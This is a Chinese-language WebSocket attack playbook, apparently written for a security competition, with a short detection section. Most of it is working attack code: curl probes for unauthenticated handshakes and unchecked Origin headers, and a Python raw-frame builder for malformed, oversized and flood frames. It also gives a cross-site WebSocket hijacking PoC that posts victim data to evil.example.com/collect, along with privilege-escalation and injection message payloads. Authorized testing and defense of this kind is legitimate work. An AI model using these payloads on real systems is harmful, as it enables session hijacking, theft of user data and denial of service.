# WebSocket 运行时：握手、帧、跨站劫持与手工构造

> 被 `competition-websocket-runtime` 引用。WS 的漏洞几乎都在三处：**升级时不鉴权**、
> **升级后不校验 Origin**、**消息处理信任客户端字段**。

## 一、握手：先看升级是不是真有鉴权

```bash
# 标准握手（带认证）
curl -i -s -N \
  -H 'Connection: Upgrade' \
  -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Authorization: Bearer '$TOKEN \
  'https://target.example.com/ws'
```

**期望**：`101 Switching Protocols` + `Sec-WebSocket-Accept`。

```bash
# 不带任何认证头（最常见的问题）
curl -i -s -N \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  'https://target.example.com/ws' | head -20
```

**判据**：

- `101` 且后续能收消息 → **握手无鉴权**
- `401`/`403` → 有鉴权
- `200` + HTML → 端点不是 WS（路径错或被 SPA 通配路由吃掉）

```bash
# 常见 WS 路径
for p in /ws /websocket /socket /socket.io/ /ws/v1 /realtime /live /push /graphql; do
  printf '%-14s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
    -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
    "https://target.example.com$p"
done
```

### 1.1 握手阶段的三个断点

| 断点 | 测法 | 说明 |
| --- | --- | --- |
| **不校验 Origin** | 加 `Origin: https://evil.com` | 见 §3 跨站 WS 劫持 |
| **token 放在 query** | `?token=...` | 会进日志/Referer |
| **子协议不校验** | `Sec-WebSocket-Protocol: admin.v1` | 服务端按子协议分流实现 |
| **Cookie 未设 SameSite** | 带 cookie 握手 | 配合 CSWSH |

```bash
# Origin 不校验
curl -i -s -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Origin: https://evil.example.com' \
  -H 'Cookie: session='$SESSION \
  'https://target.example.com/ws' | head -5
```

```bash
# 子协议探测
for sp in admin.v1 graphql-ws graphql-transport-ws mqtt jsonrpc; do
  printf '%-24s ' "$sp"
  curl -s -o /dev/null -w '%{http_code} ' -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
    -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
    -H "Sec-WebSocket-Protocol: $sp" 'https://target.example.com/ws'
  curl -s -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
    -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
    -H "Sec-WebSocket-Protocol: $sp" 'https://target.example.com/ws' | grep -i 'sec-websocket-protocol'
done
```

## 二、帧格式：手工构造才能测边界

### 2.1 帧结构

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
```

| 字段 | 值 |
| --- | --- |
| opcode `0x0` | continuation |
| `0x1` | text |
| `0x2` | binary |
| `0x8` | close |
| `0x9` | ping |
| `0xA` | pong |

**客户端 → 服务端必须掩码（MASK=1）**；服务端 → 客户端必须不掩码。

### 2.2 用 Python 手工构造帧

```python
#!/usr/bin/env python3
"""ws_raw.py — 手工构造 WS 帧，测试服务端对边界帧的处理"""
import socket, ssl, base64, os, struct, sys

def handshake(host, path, origin=None, cookie=None, extra=None):
    s = socket.create_connection((host, 443))
    s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
    key = base64.b64encode(os.urandom(16)).decode()
    lines = [
        f'GET {path} HTTP/1.1', f'Host: {host}',
        'Upgrade: websocket', 'Connection: Upgrade',
        f'Sec-WebSocket-Key: {key}', 'Sec-WebSocket-Version: 13',
    ]
    if origin: lines.append(f'Origin: {origin}')
    if cookie: lines.append(f'Cookie: {cookie}')
    if extra:
        for k, v in extra.items(): lines.append(f'{k}: {v}')
    s.sendall(('\r\n'.join(lines) + '\r\n\r\n').encode())
    resp = b''
    while b'\r\n\r\n' not in resp:
        resp += s.recv(4096)
    print(resp.decode('latin1').split('\r\n')[0])
    return s

def frame(opcode, payload, mask=True, fin=True, rsv=0):
    b0 = (0x80 if fin else 0) | (rsv << 4) | opcode
    n = len(payload)
    if n < 126:
        hdr = bytes([b0, (0x80 if mask else 0) | n])
    elif n < 65536:
        hdr = bytes([b0, (0x80 if mask else 0) | 126]) + struct.pack('>H', n)
    else:
        hdr = bytes([b0, (0x80 if mask else 0) | 127]) + struct.pack('>Q', n)
    if mask:
        k = os.urandom(4)
        return hdr + k + bytes(c ^ k[i % 4] for i, c in enumerate(payload))
    return hdr + payload

if __name__ == '__main__':
    host, path = sys.argv[1], sys.argv[2]
    s = handshake(host, path, origin='https://evil.example.com')
    s.sendall(frame(0x1, b'{"action":"ping"}'))
    print(s.recv(4096))
```

```bash
python3 ws_raw.py target.example.com /ws
```

### 2.3 必测的边界帧

| 帧 | 载荷 | 期望（正确实现） | 常见错误 |
| --- | --- | --- | --- |
| **未掩码帧** | `MASK=0` | 关闭连接（1002） | 接受 → 可绕过某些代理的检测 |
| **RSV 位非零** | `rvsv=1` | 关闭连接（1002） | 接受 → 扩展协商被忽略 |
| **超大帧** | payload len = 10MB | 关闭（1009） | 接受 → 内存耗尽 |
| **分片无终止** | 只发 continuation 不发 FIN | 超时关闭 | 一直等 → 资源占用 |
| **opcode 0x3-0x7** | 保留 opcode | 关闭 | 接受 → 解析器不严格 |
| **文本帧含无效 UTF-8** | `\xff\xfe` | 关闭（1007） | 接受 → 应用层按 latin1 解 |
| **close 帧带 body** | close + 125 字节 | 只取前 2 字节状态码 | 忽略 |
| **零长度 close** | 空 | 关闭 | — |
| **ping 洪泛** | 1000 个 ping | 每个回 pong | 无限回 → 放大 |

```python
# 未掩码帧测试
s.sendall(frame(0x1, b'{"action":"ping"}', mask=False))
print(s.recv(4096))   # 正确实现应返回 close 1002

# RSV 位测试
s.sendall(frame(0x1, b'hello', rsv=4))
print(s.recv(4096))

# 无效 UTF-8
s.sendall(frame(0x1, b'\xff\xfe\xfd'))
print(s.recv(4096))
```

## 三、跨站 WebSocket 劫持（CSWSH）

原理：WS **不受同源策略约束**——网页可以向任意域发起 WS 连接。若服务端只看 cookie
不看 Origin，攻击者页面就能用受害者的 cookie 建立连接并读消息。

```
[1] 受害者访问 evil.com
[2] evil.com 的 JS: new WebSocket('wss://target.example.com/ws')
[3] 浏览器自动带上 target 的 cookie（SameSite=Lax 的 cookie 在 WS 握手时**会**带上）
[4] 服务端看到合法 cookie → 101
[5] evil.com 通过 onmessage 读受害者数据，通过 send 执行操作
```

```javascript
// 攻击者页面（最小 PoC）
const ws = new WebSocket('wss://target.example.com/ws');
ws.onopen = () => ws.send(JSON.stringify({ action: 'getProfile' }));
ws.onmessage = (e) => {
  // 把受害者的数据发回自己
  fetch('https://evil.example.com/collect', { method: 'POST', body: e.data, mode: 'no-cors' });
};
```

**关键判断链**：

| 检查 | 结果含义 |
| --- | --- |
| 握手带 `Origin: https://evil.com` 仍 101 | **Origin 不校验** |
| 无 cookie 时 401，有 cookie 时 101 | 认证依赖 cookie |
| cookie 的 `SameSite` | `Lax`/`None` 会在 WS 握手中发送 → 可利用；`Strict` 不发送 → 不可利用 |
| 消息里能否读到受害者数据 | 真正的验证 |

```bash
# 检查 cookie 的 SameSite
curl -sI https://target.example.com/login | grep -i set-cookie
# SameSite=Lax / 未设置（Chrome 默认 Lax）→ WS 握手会带
# SameSite=Strict → 跨站 WS 握手不带
```

**注意**：Chrome 对 `Lax` 的定义是"顶层导航 + 安全方法"，WS 握手是 GET，会被当作
"非安全方法"？——实际测试中 `SameSite=Lax` 的 cookie **在 WS 握手中确实会发送**
（握手走的是导航类似路径）。这一点有争议，必须实测。

## 四、消息注入与状态污染

### 4.1 未鉴权的动作

```bash
# 握手成功后，逐个试 action
python3 - <<'PY'
import json, sys
sys.path.insert(0, '.')
from ws_raw import handshake, frame
s = handshake('target.example.com', '/ws', origin='https://target.example.com')
for action in ['getProfile','getUsers','admin','listRooms','subscribe','setRole','deleteUser']:
    s.sendall(frame(0x1, json.dumps({"action": action}).encode()))
    try:
        print(action, '->', s.recv(8192)[:200])
    except Exception as e:
        print(action, 'ERR', e)
PY
```

### 4.2 字段越权

```json
{"action":"subscribe","room":"public"}
{"action":"subscribe","room":"admin-only"}        // 越权订阅
{"action":"sendMessage","to":"other-user","text":"x"}
{"action":"updateProfile","userId":1001,"role":"admin"}   // 改别人
```

### 4.3 GraphQL over WS（subscriptions）

```bash
# graphql-ws 协议的订阅消息
{"type":"connection_init","payload":{"Authorization":"Bearer TOKEN"}}
{"id":"1","type":"subscribe","payload":{"query":"subscription{orderUpdated{id total buyer{email}}"}}
```

**重点**：订阅的**过滤条件**是否在服务端校验。常见漏洞是"订阅全站事件"：

```bash
# 订阅所有订单更新（不带任何 owner 过滤）
curl -s -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Sec-WebSocket-Protocol: graphql-ws' \
  'wss://target.example.com/graphql'  # 实际用 wscat
```

```bash
# 用 wscat（最方便）
npm i -g wscat
wscat -c 'wss://target.example.com/graphql' -H 'Sec-WebSocket-Protocol: graphql-ws' \
  -H 'Origin: https://evil.example.com'
# 连上后输入：
{"type":"connection_init","payload":{}}
{"id":"1","type":"subscribe","payload":{"query":"subscription{orderUpdated{id email total}}"}}
```

### 4.4 消息注入到下游

WS 消息常被转发到内部服务（Redis pub/sub、消息队列、下游 WS）。若消息字段直接拼接：

```
{"action":"join","room":"public"}\r\n{"action":"admin"}    ← 若按行分隔解析
{"action":"join","room":"public\",\"admin\":true"}          ← JSON 拼接
```

## 五、工具与命令

```bash
# wscat（Node，最常用）
npm i -g wscat
wscat -c wss://target.example.com/ws -H 'Authorization: Bearer TOKEN'
wscat -c wss://target.example.com/ws --origin https://evil.example.com

# websocat（Rust，功能更强，能转 TCP/文件）
cargo install websocat
websocat -H 'Origin: https://evil.example.com' wss://target.example.com/ws
# 从 stdin 发消息，不走交互
echo '{"action":"getUsers"}' | websocat -H 'Origin: https://evil.example.com' wss://target.example.com/ws

# 把 WS 转成普通 TCP（配合 nc 手工发帧）
websocat -E - tcp-listen:9001 wss://target.example.com/ws

# Python websockets 库（写脚本）
pip install websockets
```

```python
# 批量测试：并发多个连接 + 记录所有消息
import asyncio, websockets, json

async def probe(uri, origin, msgs):
    async with websockets.connect(uri, additional_headers={'Origin': origin}) as ws:
        for m in msgs:
            await ws.send(json.dumps(m))
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=3)
                print(f'{m} -> {r[:200]}')
            except asyncio.TimeoutError:
                print(f'{m} -> TIMEOUT')

asyncio.run(probe('wss://target.example.com/ws', 'https://evil.example.com',
                  [{"action":"ping"},{"action":"getUsers"},{"action":"admin"}]))
```

## 六、验伤：WS 的成功标准

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 握手无鉴权 | 101 + 收到**业务数据**（非空、含真实字段） | 101 但服务端立刻 close（1008） |
| Origin 不校验 | `Origin: evil.com` 仍 101 且能收消息 | 101 但消息全是 error |
| CSWSH 可利用 | 从**攻击者页面**读到受害者数据 | 只在自己浏览器里手动加 Origin 头成功（那是没浏览器约束） |
| 订阅越权 | 收到**别人的**事件（含他人 email/订单） | 只收到自己的事件 |
| 帧边界问题 | 服务端接受了非法帧（返回数据而非 close） | 返回 close 1002（那是正确行为） |
| 消息注入 | 下游服务出现注入效果（多了一条记录/命令执行） | 只是消息被拒 |

**CSWSH 验伤必须用真实浏览器**：在 evil.com 的页面里跑 JS 连 target（而非用 curl 加 Origin
头）。curl 不受同源策略约束，测不出"浏览器会不会带 cookie"。

```html
<!-- evil.html，放到攻击者域，用真浏览器打开 -->
<script>
const ws = new WebSocket('wss://target.example.com/ws');
ws.onopen = () => ws.send('{"action":"getProfile"}');
ws.onmessage = e => document.title = 'GOT:' + e.data.slice(0, 50);
</script>
```

打开后看页面标题是否变成 `GOT:...` —— 这是最直观的证据。

## 七、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 无鉴权握手 | 网关/WAF | `101` 响应且请求无 `Authorization`/`Cookie` |
| Origin 不校验 | WS 服务日志 | `Origin` 不在白名单；`Origin` 缺失 |
| CSWSH | 服务端 | 同一 cookie 在两个不同 Origin 下建立连接（需记录 Origin） |
| 非法帧 | WS 库日志 | 收到未掩码帧 / RSV 非零 / 保留 opcode |
| 帧洪泛 | 网络 | 单连接帧速率异常；ping/pong 比例失衡 |
| 订阅越权 | 应用审计 | 订阅的过滤条件为空或与用户不匹配 |
| 消息注入 | 下游日志 | WS 消息字段出现在 SQL/命令/模板上下文 |

**必须记的字段**：`Origin`、`Sec-WebSocket-Protocol`、握手时的 `Cookie`/`Authorization`、
每条消息的 `action`。缺 `Origin` 就无法检测 CSWSH。

## 八、常见坑

1. **用 curl 测握手但看不到消息**——`curl -N` 能看到 101 后的一些字节，但发帧必须用 wscat/websocat/脚本。
2. **CSWSH 用 curl 加 Origin 头就当成功**——curl 不受浏览器同源策略约束，这只证明"服务端不校验 Origin"，不证明"浏览器会带 cookie"。必须用真浏览器。
3. **忘记 `SameSite` 的影响**——`Strict` 的 cookie 在跨站 WS 握手时不发送，CSWSH 不可用。先看 `Set-Cookie`。
4. **帧长度字段写错**——payload < 126 时长度直接放 7 位；126 时后面跟 2 字节；127 时跟 8 字节。混了就是解析错误。
5. **掩码算法错**——`payload[i] ^ key[i % 4]`，不是 `key[i]`。
6. **HTTPS 上忘了 TLS 包装**——`socket.create_connection` + `ssl.wrap_socket`，直接 `connect(443)` 发明文会被拒。
7. **wscat 的 `-H` 参数位置**——`wscat -c URL -H 'Header: value'`，顺序反了会报错。
8. **测试后连接没关**——WS 连接会占服务端资源，测完要发 close 帧或断开。